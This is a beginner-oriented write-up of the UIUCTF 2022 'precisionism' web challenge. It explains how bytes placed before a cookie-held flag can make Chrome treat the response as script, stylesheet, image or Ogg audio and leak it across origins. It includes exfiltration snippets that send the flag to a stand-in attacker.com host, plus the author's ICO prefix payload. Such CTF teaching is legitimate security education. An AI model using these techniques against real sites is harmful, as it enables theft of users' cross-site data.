# precisionism - UIUCTF 2022

## Intro

I played [UIUCTF](https://ctftime.org/event/1600/) a few weeks ago and there were many awesome challenges. I worked on some of the web challenges and this is the write-up for the "precisionism" challenge [as3617](https://twitter.com/real_as3617) and I managed to solve it. I was planning to write this to be beginner-friendly, so I have included some information for beginners.

## Downloading the challenge

The challenge attachment folder structure is like this:

```
/ precisionism
  - app.py
  - Dockerfile
/ism-bot
  - bot.js
```

There are also a netcat command and a url in the challenge description.

```
nc ism-bot.chal.uiuc.tf 1337
https://precisionism-web.chal.uiuc.tf/
```

The word "bot" means that this is most probably going to be a client-side web challenge ( it was ).

> What is a client-side web challenge?
For example, you are logged in at `gmail.com` when your friend sends you a link to a malicious page in Discord, and then you open that link. The malicious page exploits(XSS,CSRF) `gmail.com` and sends your emails to your friend. 
>
> Client-side web challenges simulate this process. There is a browser running inside the server that is controlled automatically and it is logged in at `gmail.com` and you have to write a malicious page to steal the emails. However, the goal is not always to steal the cookie. Sometimes the goal is doing [XSLeaks](https://xsleaks.dev/) or other kinds of stuff. 


#### `app.py`

```py
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() #^uiuctf{[0-9A-Za-z]{8}}$
    return Response(prefix+flag+b"Enjoy your flag!", mimetype="text/plain")
```

The webapp is pretty simple. Basically, the server appends the flag and "Enjoy your flag!" at the end of your given bytes and puts that in the response. The content-type of the response is ‍`text/plain`. For example, if I request `http://challenge.com/?p=574f57` the response is

```
WOWuiuctf{FAKEFLAG}Enjoy your flag!
```

The flag comes from the cookie, so if admin requests that url, the response is

```
WOWuiuctf{real-flag}Enjoy your flag!
```

#### bot.js

This code handles the headless browser. There is nothing special in there. It just sets the FLAG cookie (same-site attribute is set to 'none') to the challenge flag and navigates to the URL that the player sends. 

## Initial analysis

The content-type of the response is `text/plain` so XSS is not possible and there are no endpoints to do a CSRF attack. At this point, the most promising way to solve this seems to be playing with the same-origin policy. 

[In some circumstances](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_network_access), SOP allows network access to other origins even if there is no `Access-Control-Allow-Origin` header in the response. For example, you don't need that header when loading Javascript scripts from other origins. **But** Chrome uses an algorithm to detect whether the response is eligible for cross-site usage or not. This is why you can't just include google.com home page as a javascript script. This algorithm is called CORB. You can read more about it [here](https://chromium.googlesource.com/chromium/src/+/master/services/network/cross_origin_read_blocking_explainer.md).

If you try to include google.com as a script, you will receive the following message in the console.

```!
Cross-Origin Read Blocking (CORB) blocked cross-origin response https://www.google.com/ with MIME type text/html. See https://www.chromestatus.com/feature/5629709824032768 for more details.
```

Our mission in this task is to bypass CORB by controlling the first bytes of the response.

#### Why can't i just fetch the flag

You might guess (or might not if you know about SOP) that why can't we just use `fetch` or `XMLHttpRequest` to get the flag; You can find your answer by reading about [the Same-Origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy). There are many resources to learn about this.

#### Cookies

The FLAG cookie's same-site attribute is 'none', so Chrome sends the FLAG cookie with cross-site requests. For example, script tag requests have this cookie. If the cookie's same-site attribute was 'lax' or 'strict', the attack would not be possible.

#### What CORB allows us to do

The next step is to research about CORB and what mime-types it allows, what kind of elements can request cross-site resources and these kind of stuff. Basically, we have to dig into online documents and the Chromium source code. 

While solving the challenge, I didn't know that CORB is documented by Google, so I started with the mime-types and elements I knew about.

## text/javascript

The first thing that came to my mind was creating a valid javascript that holds the flag in itself.

The response from `http://challenge.com/?p=2f2f` is a valid javascript code.

```js
//uiuctf{FAKEFLAG}Enjoy your flag!
```

But the problem was that I couldn't find any way to read the Javascript comments. I tried to come up with a trick or something, but I failed. I gave up on it after about 20 minutes of trying.

To understand the challenge better, I'm going to write an example exploit If "Enjoy your flag!" was not in the response. If it was not at the end of the response, we could solve this by constructing the following code.

```js
class uiuctf{FAKEFLAG}
```

The `toString()` method of classes returns the source code of the class.

```js
class test{
    whatisthis
}
console.log(test.toString())
/*
Output: 
class test{
    whatisthis
}
*/
```

And we could exfiltrate the flag with the following code.

```html
<script src="http://localhost:1337/?p=636c61737320"></script>
<script>
    document.location = 'http://attacker.com/?flag='+uiuctf.toString()) 
    // attacker.com receives a request with the flag in the query params
</script>
```

## text/css

While I was playing with javascript, my teammate pasted an interesting code in the discord channel.

```html
<style>@import 'http://attacker.com?a=uiuctf{FAKEFLAG}Enjoy your flag!</style>
```

When I tried the payload, I saw a request to `http://attacker.com` that contained the flag! Chrome fixes the CSS syntax for us and closes the quoted-string automatically.

```
https://attacker.com/?a=uiuctf{FAKEFLAG}Enjoy%20your%20flag!
```

So was it just this? We thought that this is the solution. But When we tried to include `http://challenge.com/?p=40696d706f72742027687474703a2f2f61747461636b65722e636f6d3f666c61673d` as a css stylesheet, it didn't work.

```html
<!--
The hex-encoded string decodes to `@import 'http://attacker.com?flag=`
-->
<link rel="stylesheet" href="/?p=40696d706f72742027687474703a2f2f61747461636b65722e636f6d3f666c61673d">
```

We were confused. My teammate and I spent some time trying to find out why it was not working. 

We then concluded that Chrome strictly checks that the content-type header of the stylesheet response is `text/css`. We were not so sure because there was no error message in the console. But eventually, we gave up on this idea.

> Actually, there is a section in Google's CORB documentation that mentions this behavior. It says the cross-origin stylesheet content-type should be `text/css`.
> I wish we had found this documentation during the ctf.

## image/png

I spent most of my time on this file type, which eventually didn't work. I started by reading PNG's wikipedia page.

Each PNG file has a header followed by a series of chunks. The header's length is only 8 bytes, and it contains the magic number and other stuff.

Each chunk consists of four parts. length, chunk type/name, chunk data, and CRC chucksum.

```
Length - 4 bytes big-endian
Chunk type - 4 bytes
Chunk data - n bytes
CRC - 4 bytes
```

That CRC field looked interesting. I wrote a python script to generate a valid PNG file. 

```python
#!/usr/bin/env python3
f = open('./file.png','wb')

buf = b''
buf += b'\x89PNG\r\n\x1a\n' # Header

##### IHDR chunk
buf += (13).to_bytes(4,byteorder='big') #Length of data section
buf += b'IHDR' #Chunk type
buf += b'\x00\x00\x00\x01\x00\x00\x00\x01\x01\x03\x00\x00\x00' #data section
buf += b'%\xdbV\xca' #CRC32 of chunkType+chunkData

### Adding other chunks
buf += (3).to_bytes(4,byteorder='big')
buf += b'PLTE'
# Not important stuff ... 
### 

buf += (0).to_bytes(4,byteorder='big') #IEND chunk data length is zero
buf += b'IEND'
buf += b''
buf += b'\xaeB`\x82' #CRC32 of chunkType+ChunkData

f.write(buf)
f.close()
```

You don't need to know what each chunk does. I just downloaded a 1x1 png file and looked at its structure. Then an idea occurred to me.

> If you don't know what CRC32 is you can refer to [this](https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art008) article.


The IEND chunk doesn't have any data, and its data_length is zero. If we put some data in it, then the checksum field changes. And when the checksum is incorrect, the image shouldn't load. For example, to check if the first byte of the flag is z or not:

```python
data = b'CRC32 of this chunks is \x41\x41\x41z'

buf += (len(data)).to_bytes(4,byteorder='big')
buf += b'IEND'
buf += data
buf += b'\x41\x41\x41' #Last byte is not inserted
```

Basically, this was the plan. Some open-source tools are already out there to generate CRC32 collisions. This way, we can bruteforce the flag.

```
CRC32("CRC32 is \x41\x41\x41A") -> image error -> incorrect
CRC32("CRC32 is \x41\x41\x41B") -> image error -> incorrect
CRC32("CRC32 is \x41\x41\x41C") -> image loaded -> correct - first byte of flag is C

CRC32("CRC32 is \x41\x41CA") -> image error -> incorrect
CRC32("CRC32 is \x41\x41CB") -> image loaded -> correct - second byte of flag is B
```

As I said, it eventually didn't work 😢. The reason was that Chrome ignores the CRC32 of chunks. My mistake was that I was checking the image with my OS image viewer. I also looked at the Chromium source code to see why it ignores the CRC checksum and to find out if there is a way to fix it. Eventually, I gave up on this idea.

## Other image formats

I also looked at ico, bitmat, jpeg and webp to see if they are usable. To find out what image formats chrome supports, i looked at [chromium source code](https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/platform/image-decoders). I mostly used online documents rather than reading the source code since it was faster. 

## audio/ogg (worked 🎉)

I decided to take a look at video and audio formats. I started to look for formats that use checksums and are structured like the PNG format. After looking at a few ones like mkv and mp3, I opened the Ogg wikipedia page and then I searched for the word `crc` and there was a result for the search!

According to Wikipedia, "Ogg files contain a series of chunks called 'Ogg page' and each chunk has a header which contains a checksum of the whole page". When I read this while solving the challenge, I tried to construct a valid ogg audio file with python, but it looked too time-consuming.

After giving up on constructing it manually, I tried another approach. 

First i needed to detect whether the audio file is valid or not.  [The `Audio()` constructor](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAudioElement/Audio) can do it because it has a onerror attribute. 

```javascript
var a = new Audio('./gen.ogg')
a.onerror = _=>alert()
```

Then i downloaded a short ogg file and changed the last byte and the onerror was triggered. It looked like a checksum error. I read some documents about ogg files to find out where the checksum is in the file and how it works. I wrote an exploit and it worked perfectly! You can refer to the script comments to see how it works.

![poc](https://i.imgur.com/ucxRNRb.gif)


Solve scripts are available at [here](https://github.com/parrot409/precisionism-writeup) and an online version of POC is available at [here](http://poc.pwnn.net:60004/). It tries to leak `uiuctf{wowItActuallyWorks}` from `http://poc.pwnn.net:60005/`. Your internet speed affects how fast it works. you can open the networks tab to see the progress. I think it can be optimized.

## The Intended Solution

The author's intended solution uses ICO files to exfiltrate 8-9 bytes maximum which is also a cool solution. Quoting from the author:

the solution idea is simple, we come up with a prefix s.t. the resource is interpreted as an image, and the flag contents are reflected in the height/width properties. `b'\x00\x00\x01\x00\x02\x00\x01\x01\x00\x00\x01\x00\x20\x00\x68\x04\x00\x00\x26\x00\x00\x00'` works! it is an ICO file with two entries, we strip bytes from the end to read more of the flag. this fileformat only reliably lets you exfiltrate 8-9 bytes.

Author's solve script is available at [here](https://github.com/sigpwny/UIUCTF-2022-Public/tree/main/web/precisionism/solution). 

## Conclusion

Thanks to the The UIUCTF organizers and the author [@arxenix](https://twitter.com/ankursundara) for creating this awesome task. Creating these kind of tasks is way harder than solving it.


